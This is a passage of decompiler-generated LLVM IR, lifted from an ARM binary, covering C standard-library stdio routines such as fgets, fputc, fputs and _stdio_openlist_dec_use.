dec_label_pc_25540..thread4_crit_edge:            ; preds = %dec_label_pc_25540
  %v0_2555c.pre = load i32, i32* @ip, align 4
  br label %.thread4

bb15:                                             ; preds = %dec_label_pc_25540
  %v1_25554 = load i32, i32* %r5.global-to-local, align 4
  %v3_25554 = add i32 %v1_25554, 76
  %v4_25554 = inttoptr i32 %v3_25554 to i32*
  %v5_25554 = load i32, i32* %v4_25554, align 4
  store i32 %v5_25554, i32* @ip, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_25540..thread4_crit_edge, %bb15
  %v0_2555c = phi i32 [ %v0_2555c.pre, %dec_label_pc_25540..thread4_crit_edge ], [ %v5_25554, %bb15 ]
  %v2_2555c = xor i1 %v0_25540, true
  call void @__pseudo_cond_branch(i1 %v2_2555c, i32 %v0_2555c)
  %v0_25560 = load i32, i32* %r4.global-to-local, align 4
  %v1_25560 = and i32 %v0_25560, 4
  %v2_25568 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_25568, i32* @r4, align 4
  ret i32 %v1_25560

; uselistorder directives
  uselistorder i1 %v0_25540, { 1, 0 }
  uselistorder i32 %v1_254ec, { 1, 0 }
  uselistorder i32 %v4_254e4, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_25540, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_25574(i32 %arg1) local_unnamed_addr {
dec_label_pc_25574:
  %v0_25574 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_25574, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_25574
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_25574, %bb
  %v4_25580 = phi i32 [ %arg1, %dec_label_pc_25574 ], [ 0, %bb ]
  ret i32 %v4_25580

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_25584 = load i32, i32* @r4, align 4
  store i32 %v3_25584, i32* %stack_var_-28, align 4
  %v6_25584 = load i32, i32* @r5, align 4
  %v9_25584 = load i32, i32* @r6, align 4
  %v12_25584 = load i32, i32* @r7, align 4
  %v21_25584 = load i32, i32* @lr, align 4
  %v1_25588 = add i32 %arg3, 52
  %v2_25588 = inttoptr i32 %v1_25588 to i32*
  %v3_25588 = load i32, i32* %v2_25588, align 4
  %v1_25590 = sub i32 1, %v3_25588
  %v2_25590 = icmp ult i32 %v3_25588, 2
  br i1 %v2_25590, label %bb16, label %bb

bb:                                               ; preds = %entry
  br label %bb16

bb16:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_25590, %entry ]
  %v0_25598 = phi i32 [ 0, %bb ], [ %v1_25590, %entry ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_25598 = icmp eq i32 %v0_25598, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_25598, label %dec_label_pc_255ec, label %dec_label_pc_255b4

dec_label_pc_255b4:                               ; preds = %bb16
  %v1_255b8 = add i32 %arg3, 56
  store i32 %v1_255b8, i32* @r4, align 4
  %v4_255cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_255cc)
  %v0_255e0 = load i32, i32* @r5, align 4
  %v2_255e0 = add i32 %v0_255e0, 36
  %v3_255e0 = inttoptr i32 %v2_255e0 to i32*
  %v4_255e0 = load i32, i32* %v3_255e0, align 4
  store i32 %v4_255e0, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_255ec.1662 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_255e0)
  %v0_255ec.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_255f0.pre = load i32, i32* @r7, align 4
  %v0_255f4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_255ec

dec_label_pc_255ec:                               ; preds = %bb16, %dec_label_pc_255b4
  %v0_255f4 = phi i32 [ %arg3, %bb16 ], [ %v0_255f4.pre, %dec_label_pc_255b4 ]
  %v0_255f0 = phi i32 [ %arg2, %bb16 ], [ %v0_255f0.pre, %dec_label_pc_255b4 ]
  %v0_255ec = phi i32 [ %arg1, %bb16 ], [ %v0_255ec.pre, %dec_label_pc_255b4 ]
  %v3_255f8 = inttoptr i32 %v0_255ec to i8*
  %v4_255f8 = call i32 @__GI_fgets_unlocked(i8* %v3_255f8, i32 %v0_255f0, i32 %v0_255f4)
  %v0_255fc = load i32, i32* %sl.global-to-local, align 4
  %v2_255fc = icmp eq i32 %v0_255fc, 0
  store i32 %v4_255f8, i32* %r4.global-to-local, align 4
  br i1 %v2_255fc, label %dec_label_pc_255ec..thread3_crit_edge, label %bb17

dec_label_pc_255ec..thread3_crit_edge:            ; preds = %dec_label_pc_255ec
  %v0_25618.pre = load i32, i32* @ip, align 4
  br label %.thread3

bb17:                                             ; preds = %dec_label_pc_255ec
  %v1_25610 = load i32, i32* @r5, align 4
  %v3_25610 = add i32 %v1_25610, 76
  %v4_25610 = inttoptr i32 %v3_25610 to i32*
  %v5_25610 = load i32, i32* %v4_25610, align 4
  store i32 %v5_25610, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_255ec..thread3_crit_edge, %bb17
  %v0_25618 = phi i32 [ %v0_25618.pre, %dec_label_pc_255ec..thread3_crit_edge ], [ %v5_25610, %bb17 ]
  %v2_25618 = xor i1 %v2_255fc, true
  call void @__pseudo_cond_branch(i1 %v2_25618, i32 %v0_25618)
  %v0_2561c = load i32, i32* %r4.global-to-local, align 4
  %v2_25624 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_25624, i32* @r4, align 4
  store i32 %v6_25584, i32* @r5, align 4
  store i32 %v9_25584, i32* @r6, align 4
  store i32 %v12_25584, i32* @r7, align 4
  store i32 %v21_25584, i32* @lr, align 4
  ret i32 %v0_2561c

; uselistorder directives
  uselistorder i32 %v3_25588, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_255ec, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_25630(i32 %arg1) local_unnamed_addr {
dec_label_pc_25630:
  %v0_25630 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_25630, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_25630
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_25630, %bb
  %v4_2563c = phi i32 [ %arg1, %dec_label_pc_25630 ], [ 0, %bb ]
  ret i32 %v4_2563c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_fputc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_25640 = load i32, i32* @r4, align 4
  store i32 %v3_25640, i32* %stack_var_-20, align 4
  %v6_25640 = load i32, i32* @r5, align 4
  %v9_25640 = load i32, i32* @r6, align 4
  %v12_25640 = load i32, i32* @r7, align 4
  %v15_25640 = load i32, i32* @lr, align 4
  %v1_25644 = add i32 %arg2, 52
  %v2_25644 = inttoptr i32 %v1_25644 to i32*
  %v3_25644 = load i32, i32* %v2_25644, align 4
  store i32 %v3_25644, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2564c = icmp eq i32 %v3_25644, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_2564c, label %dec_label_pc_25690, label %dec_label_pc_25664

dec_label_pc_25664:                               ; preds = %entry
  %v1_25664 = add i32 %arg2, 16
  %v2_25664 = inttoptr i32 %v1_25664 to i32*
  %v3_25664 = load i32, i32* %v2_25664, align 4
  store i32 %v3_25664, i32* %r2.global-to-local, align 4
  %v1_25668 = add i32 %arg2, 28
  %v2_25668 = inttoptr i32 %v1_25668 to i32*
  %v3_25668 = load i32, i32* %v2_25668, align 4
  store i32 %v3_25668, i32* %r3.global-to-local, align 4
  %v3_2566c = icmp uge i32 %v3_25664, %v3_25668
  store i1 %v3_2566c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_2566c, label %dec_label_pc_25664.dec_label_pc_25684_crit_edge, label %.thread

dec_label_pc_25664.dec_label_pc_25684_crit_edge:  ; preds = %dec_label_pc_25664
  %.pre = trunc i32 %arg1 to i8
  br label %dec_label_pc_25684

.thread:                                          ; preds = %dec_label_pc_25664
  %v2_25670 = urem i32 %arg1, 256
  store i32 %v2_25670, i32* %r3.global-to-local, align 4
  %v2_25674 = trunc i32 %arg1 to i8
  %v4_25674 = inttoptr i32 %v3_25664 to i8*
  store i8 %v2_25674, i8* %v4_25674, align 1
  %v5_25674 = load i32, i32* %r2.global-to-local, align 4
  %v6_25674 = add i32 %v5_25674, 1
  store i32 %v6_25674, i32* %r2.global-to-local, align 4
  %v0_25678.pr.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_25678.pr.pr, label %dec_label_pc_25684, label %.thread2

.thread2:                                         ; preds = %.thread
  %v1_25678 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_25678, i32* %r4.global-to-local, align 4
  store i32 %v6_25674, i32* %v2_25664, align 4
  br label %dec_label_pc_25710

dec_label_pc_25684:                               ; preds = %dec_label_pc_25664.dec_label_pc_25684_crit_edge, %.thread
  %v2_25684.pre-phi = phi i8 [ %.pre, %dec_label_pc_25664.dec_label_pc_25684_crit_edge ], [ %v2_25674, %.thread ]
  %v3_25684 = call i32 @putc_unlocked(i8 %v2_25684.pre-phi, i32 %arg2)
  store i32 %v3_25684, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_25710

dec_label_pc_25690:                               ; preds = %entry
  store i32 96, i32* %r3.global-to-local, align 4
  %v1_25694 = add i32 %arg2, 56
  store i32 %v1_25694, i32* @r4, align 4
  store i32 %v1_25694, i32* %r2.global-to-local, align 4
  store i32 164, i32* %r3.global-to-local, align 4
  %v4_256a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_256a8)
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_256bc = load i32, i32* @r6, align 4
  %v2_256bc = add i32 %v0_256bc, 36
  %v3_256bc = inttoptr i32 %v2_256bc to i32*
  %v4_256bc = load i32, i32* %v3_256bc, align 4
  store i32 153288, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_256bc)
  %v0_256c8 = load i32, i32* @r5, align 4
  %v1_256c8 = add i32 %v0_256c8, 16
  %v2_256c8 = inttoptr i32 %v1_256c8 to i32*
  %v3_256c8 = load i32, i32* %v2_256c8, align 4
  store i32 %v3_256c8, i32* %r2.global-to-local, align 4
  %v1_256cc = add i32 %v0_256c8, 28
  %v2_256cc = inttoptr i32 %v1_256cc to i32*
  %v3_256cc = load i32, i32* %v2_256cc, align 4
  store i32 %v3_256cc, i32* %r3.global-to-local, align 4
  %v3_256d0 = icmp uge i32 %v3_256c8, %v3_256cc
  store i1 %v3_256d0, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_256d0, label %dec_label_pc_256e8, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_25690
  %v1_256d4 = load i32, i32* @r7, align 4
  %v2_256d4 = urem i32 %v1_256d4, 256
  store i32 %v2_256d4, i32* %r3.global-to-local, align 4
  %v2_256d8 = trunc i32 %v1_256d4 to i8
  %v4_256d8 = inttoptr i32 %v3_256c8 to i8*
  store i8 %v2_256d8, i8* %v4_256d8, align 1
  %v5_256d8 = load i32, i32* %r2.global-to-local, align 4
  %v6_256d8 = add i32 %v5_256d8, 1
  store i32 %v6_256d8, i32* %r2.global-to-local, align 4
  %v0_256dc.pr.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_256dc.pr.pr, label %.thread4.dec_label_pc_256e8_crit_edge, label %.thread6

.thread4.dec_label_pc_256e8_crit_edge:            ; preds = %.thread4
  %v0_256ec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_256e8

.thread6:                                         ; preds = %.thread4
  %v1_256dc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_256dc, i32* %r4.global-to-local, align 4
  %v2_256e0 = load i32, i32* @r5, align 4
  %v3_256e0 = add i32 %v2_256e0, 16
  %v4_256e0 = inttoptr i32 %v3_256e0 to i32*
  store i32 %v6_256d8, i32* %v4_256e0, align 4
  br label %dec_label_pc_256f8

dec_label_pc_256e8:                               ; preds = %.thread4.dec_label_pc_256e8_crit_edge, %dec_label_pc_25690
  %v0_256ec = phi i32 [ %v0_256ec.pre, %.thread4.dec_label_pc_256e8_crit_edge ], [ %v0_256c8, %dec_label_pc_25690 ]
  %v0_256e8 = load i32, i32* @r7, align 4
  %v2_256f0 = trunc i32 %v0_256e8 to i8
  %v3_256f0 = call i32 @putc_unlocked(i8 %v2_256f0, i32 %v0_256ec)
  store i32 %v3_256f0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_256f8

dec_label_pc_256f8:                               ; preds = %.thread6, %dec_label_pc_256e8
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_25704 = load i32, i32* @r6, align 4
  %v2_25704 = add i32 %v0_25704, 76
  %v3_25704 = inttoptr i32 %v2_25704 to i32*
  %v4_25704 = load i32, i32* %v3_25704, align 4
  call void @__pseudo_branch(i32 %v4_25704)
  br label %dec_label_pc_25710

dec_label_pc_25710:                               ; preds = %.thread2, %dec_label_pc_25684, %dec_label_pc_256f8
  %v0_25710 = load i32, i32* %r4.global-to-local, align 4
  %v2_25718 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_25718, i32* @r4, align 4
  store i32 %v6_25640, i32* @r5, align 4
  store i32 %v9_25640, i32* @r6, align 4
  store i32 %v12_25640, i32* @r7, align 4
  store i32 %v15_25640, i32* @lr, align 4
  ret i32 %v0_25710

; uselistorder directives
  uselistorder i32 %v1_256d4, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 (i8, i32)* @putc_unlocked, { 6, 7, 0, 1, 2, 3, 4, 5, 8, 9 }
  uselistorder i32 %arg2, { 1, 2, 5, 4, 3, 0 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_25710, { 2, 1, 0 }
  uselistorder label %dec_label_pc_256f8, { 1, 0 }
  uselistorder label %dec_label_pc_25684, { 1, 0 }
}

define i32 @function_25724(i32 %arg1) local_unnamed_addr {
dec_label_pc_25724:
  %v0_25724 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_25724, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_25724
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_25724, %bb
  %v4_25730 = phi i32 [ %arg1, %dec_label_pc_25724 ], [ 0, %bb ]
  ret i32 %v4_25730

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_25734 = load i32, i32* @r4, align 4
  store i32 %v3_25734, i32* %stack_var_-24, align 4
  %v6_25734 = load i32, i32* @r5, align 4
  %v9_25734 = load i32, i32* @r6, align 4
  %v12_25734 = load i32, i32* @r7, align 4
  %v15_25734 = load i32, i32* @r8, align 4
  %v18_25734 = load i32, i32* @lr, align 4
  %v1_25738 = add i32 %arg2, 52
  %v2_25738 = inttoptr i32 %v1_25738 to i32*
  %v3_25738 = load i32, i32* %v2_25738, align 4
  %v1_25740 = sub i32 1, %v3_25738
  %v2_25740 = icmp ult i32 %v3_25738, 2
  br i1 %v2_25740, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_25740, %entry ]
  %v0_25748 = phi i32 [ 0, %bb ], [ %v1_25740, %entry ]
  store i32 %storemerge, i32* @r8, align 4
  %v2_25748 = icmp eq i32 %v0_25748, 0
  store i32 %arg2, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_25748, label %dec_label_pc_25798, label %dec_label_pc_25760

dec_label_pc_25760:                               ; preds = %thread-pre-split
  %v1_25764 = add i32 %arg2, 56
  store i32 %v1_25764, i32* @r4, align 4
  %v4_25778 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_25778)
  %v0_2578c = load i32, i32* @r5, align 4
  %v2_2578c = add i32 %v0_2578c, 36
  %v3_2578c = inttoptr i32 %v2_2578c to i32*
  %v4_2578c = load i32, i32* %v3_2578c, align 4
  store i32 %v4_2578c, i32* @ip, align 4
  store i32 153496, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_2578c)
  %v0_25798.pre = load i32, i32* @r7, align 4
  %v0_2579c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_25798

dec_label_pc_25798:                               ; preds = %thread-pre-split, %dec_label_pc_25760
  %v0_2579c = phi i32 [ %arg2, %thread-pre-split ], [ %v0_2579c.pre, %dec_label_pc_25760 ]
  %v0_25798 = phi i32 [ %arg1, %thread-pre-split ], [ %v0_25798.pre, %dec_label_pc_25760 ]
  %v2_257a0 = inttoptr i32 %v0_25798 to i8*
  %v3_257a0 = call i32 @__GI_fputs_unlocked(i8* %v2_257a0, i32 %v0_2579c)
  %v0_257a4 = load i32, i32* @r8, align 4
  %v2_257a4 = icmp eq i32 %v0_257a4, 0
  store i32 %v3_257a0, i32* %r4.global-to-local, align 4
  br i1 %v2_257a4, label %dec_label_pc_25798..thread6_crit_edge, label %bb16

dec_label_pc_25798..thread6_crit_edge:            ; preds = %dec_label_pc_25798
  br label %.thread6

bb16:                                             ; preds = %dec_label_pc_25798
  %v1_257b8 = load i32, i32* @r5, align 4
  %v3_257b8 = add i32 %v1_257b8, 76
  %v4_257b8 = inttoptr i32 %v3_257b8 to i32*
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_25798..thread6_crit_edge, %bb16
  %v0_257c0.in = phi i32* [ @ip, %dec_label_pc_25798..thread6_crit_edge ], [ %v4_257b8, %bb16 ]
  %v0_257c0 = load i32, i32* %v0_257c0.in, align 4
  %v2_257c0 = xor i1 %v2_257a4, true
  call void @__pseudo_cond_branch(i1 %v2_257c0, i32 %v0_257c0)
  %v0_257c4 = load i32, i32* %r4.global-to-local, align 4
  %v2_257cc = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_257cc, i32* @r4, align 4
  store i32 %v6_25734, i32* @r5, align 4
  store i32 %v9_25734, i32* @r6, align 4
  store i32 %v12_25734, i32* @r7, align 4
  store i32 %v15_25734, i32* @r8, align 4
  store i32 %v18_25734, i32* @lr, align 4
  ret i32 %v0_257c4

; uselistorder directives
  uselistorder i32 %v1_25740, { 1, 0 }
  uselistorder i32 %v3_25738, { 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 1, 2 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_25798, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_257d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_257d8:
  %v0_257d8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_257d8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_257d8
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_257d8, %bb
  %v4_257e4 = phi i32 [ %arg1, %dec_label_pc_257d8 ], [ 0, %bb ]
  ret i32 %v4_257e4

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_257e8 = load i32, i32* @r4, align 4
  store i32 %v3_257e8, i32* %stack_var_-24, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r6.global-to-local, align 4
  %v4_257f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 96) to i32*), align 4
  store i32 %v4_257f8, i32* %r8.global-to-local, align 4
  store i32 248, i32* %r3.global-to-local, align 4
  %v4_25800 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 248) to i32*), align 4
  store i32 %v4_25800, i32* %r4.global-to-local, align 4
  store i32 164, i32* %r3.global-to-local, align 4
  %v4_2580c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  store i32 %v4_2580c, i32* %r7.global-to-local, align 4
  %v2_25818 = ptrtoint i32* %stack_var_-40 to i32
  call void @__pseudo_branch(i32 %v4_2580c)
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_2582c = load i32, i32* %r6.global-to-local, align 4
  %v2_2582c = add i32 %v0_2582c, 36
  %v3_2582c = inttoptr i32 %v2_2582c to i32*
  %v4_2582c = load i32, i32* %v3_2582c, align 4
  store i32 %v4_2582c, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_2582c)
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_2583c = load i32, i32* %r6.global-to-local, align 4
  %v2_2583c = add i32 %v0_2583c, 12
  %v3_2583c = inttoptr i32 %v2_2583c to i32*
  %v4_2583c = load i32, i32* %v3_2583c, align 4
  store i32 %v4_2583c, i32* %r3.global-to-local, align 4
  %v1_25840 = inttoptr i32 %v4_2583c to i32*
  %v2_25840 = load i32, i32* %v1_25840, align 4
  store i32 %v2_25840, i32* %r3.global-to-local, align 4
  %v7_25844 = icmp eq i32 %v2_25840, 1
  br i1 %v7_25844, label %dec_label_pc_2584c, label %dec_label_pc_2590c

dec_label_pc_2584c:                               ; preds = %entry
  store i32 116, i32* %r3.global-to-local, align 4
  %v2_25850 = add i32 %v0_2583c, 116
  %v3_25850 = inttoptr i32 %v2_25850 to i32*
  %v4_25850 = load i32, i32* %v3_25850, align 4
  store i32 %v4_25850, i32* %r3.global-to-local, align 4
  %v1_25854 = inttoptr i32 %v4_25850 to i32*
  %v2_25854 = load i32, i32* %v1_25854, align 4
  store i32 %v2_25854, i32* %r3.global-to-local, align 4
  %tmp30 = icmp slt i32 %v2_25854, 1
  br i1 %tmp30, label %dec_label_pc_2590c, label %dec_label_pc_25860

dec_label_pc_25860:                               ; preds = %dec_label_pc_2584c
  store i32 224, i32* %r3.global-to-local, align 4
  %v2_25864 = add i32 %v0_2583c, 224
  %v3_25864 = inttoptr i32 %v2_25864 to i32*
  %v4_25864 = load i32, i32* %v3_25864, align 4
  store i32 %v4_25864, i32* %r4.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_2580c)
  call void @__pseudo_branch(i32 %v4_2582c)
  %v0_2588c = load i32, i32* %r6.global-to-local, align 4
  %v2_2588c = add i32 %v0_2588c, 108
  %v3_2588c = inttoptr i32 %v2_2588c to i32*
  %v4_2588c = load i32, i32* %v3_2588c, align 4
  store i32 %v4_2588c, i32* %r3.global-to-local, align 4
  %v1_25890 = inttoptr i32 %v4_2588c to i32*
  %v2_25890 = load i32, i32* %v1_25890, align 4
  store i32 %v2_25890, i32* %r4.global-to-local, align 4
  store i32 108, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_258dc11 = icmp eq i32 %v2_25890, 0
  br i1 %v2_258dc11, label %dec_label_pc_258e8, label %dec_label_pc_258a0

dec_label_pc_258a0:                               ; preds = %dec_label_pc_25860, %dec_label_pc_258d8
  %v0_258c42 = phi i32 [ %v0_258d8, %dec_label_pc_258d8 ], [ %v2_25890, %dec_label_pc_25860 ]
  %v1_258a0 = inttoptr i32 %v0_258c42 to i16*
  %v2_258a0 = load i16, i16* %v1_258a0, align 2
  %v3_258a0 = zext i16 %v2_258a0 to i32
  store i32 %v3_258a0, i32* %r3.global-to-local, align 4
  %v2_258a4 = and i32 %v3_258a0, 32816
  %v7_258a8 = icmp eq i32 %v2_258a4, 48
  %v1_258ac = add i32 %v0_258c42, 32
  %v2_258ac = inttoptr i32 %v1_258ac to i32*
  %v3_258ac = load i32, i32* %v2_258ac, align 4
  store i32 %v3_258ac, i32* %r5.global-to-local, align 4
  br i1 %v7_258a8, label %dec_label_pc_258b8, label %.thread21

.thread21:                                        ; preds = %dec_label_pc_258a0
  store i32 %v0_258c42, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_258d8

dec_label_pc_258b8:                               ; preds = %dec_label_pc_258a0
  %v0_258b8 = load i32, i32* %r7.global-to-local, align 4
  %v2_258b8 = icmp eq i32 %v0_258b8, 0
  br i1 %v2_258b8, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_258b8
  %v1_258bc = load i32, i32* %r6.global-to-local, align 4
  %v2_258bc = load i32, i32* %r8.global-to-local, align 4
  %v3_258bc = add i32 %v2_258bc, %v1_258bc
  %v4_258bc = inttoptr i32 %v3_258bc to i32*
  %v5_258bc = load i32, i32* %v4_258bc, align 4
  store i32 %v5_258bc, i32* %r3.global-to-local, align 4
  %v3_258c0 = inttoptr i32 %v5_258bc to i32*
  store i32 %v3_258ac, i32* %v3_258c0, align 4
  %v0_258c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_258c4 = inttoptr i32 %v0_258c4 to i16*
  %v2_258c4 = load i16, i16* %v1_258c4, align 2
  %v3_258c4 = zext i16 %v2_258c4 to i32
  store i32 %v3_258c4, i32* %r3.global-to-local, align 4
  br label %bb31

bb:                                               ; preds = %dec_label_pc_258b8
  %v2_258c48 = load i16, i16* %v1_258a0, align 2
  %v3_258c49 = zext i16 %v2_258c48 to i32
  store i32 %v3_258c49, i32* %r3.global-to-local, align 4
  %v3_258c8 = add i32 %v0_258b8, 32
  %v4_258c8 = inttoptr i32 %v3_258c8 to i32*
  store i32 %v3_258ac, i32* %v4_258c8, align 4
  %v0_258cc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %.thread, %bb
  %v0_258cc = phi i32 [ %v3_258c4, %.thread ], [ %v0_258cc.pre, %bb ]
  %v1_258cc = and i32 %v0_258cc, 8192
  %v2_258cc = icmp eq i32 %v1_258cc, 0
  br i1 %v2_258cc, label %bb33, label %bb32

bb32:                                             ; preds = %bb31
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_258d4 = xor i1 %v2_258cc, true
  call void @__pseudo_cond_branch(i1 %v1_258d4, i32 ptrtoint (i32* @global_var_29ae4.1572 to i32))
  %v0_258d8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_258d8

dec_label_pc_258d8:                               ; preds = %.thread21, %bb33
  %v0_258d8 = phi i32 [ %v0_258d8.pre, %bb33 ], [ %v3_258ac, %.thread21 ]
  store i32 %v0_258d8, i32* %r4.global-to-local, align 4
  %v2_258dc = icmp eq i32 %v0_258d8, 0
  br i1 %v2_258dc, label %dec_label_pc_258dc.dec_label_pc_258e8_crit_edge, label %dec_label_pc_258a0

dec_label_pc_258dc.dec_label_pc_258e8_crit_edge:  ; preds = %dec_label_pc_258d8
  %v0_258f4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_258e8

dec_label_pc_258e8:                               ; preds = %dec_label_pc_258dc.dec_label_pc_258e8_crit_edge, %dec_label_pc_25860
  %v0_258f4 = phi i32 [ %v0_258f4.pre, %dec_label_pc_258dc.dec_label_pc_258e8_crit_edge ], [ %v0_2588c, %dec_label_pc_25860 ]
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_258f4 = add i32 %v0_258f4, 76
  %v3_258f4 = inttoptr i32 %v2_258f4 to i32*
  %v4_258f4 = load i32, i32* %v3_258f4, align 4
  call void @__pseudo_branch(i32 %v4_258f4)
  store i32 116, i32* %r3.global-to-local, align 4
  %v0_25904 = load i32, i32* %r6.global-to-local, align 4
  %v2_25904 = add i32 %v0_25904, 116
  %v3_25904 = inttoptr i32 %v2_25904 to i32*
  %v4_25904 = load i32, i32* %v3_25904, align 4
  store i32 %v4_25904, i32* %r3.global-to-local, align 4
  %v0_25908 = load i32, i32* %r4.global-to-local, align 4
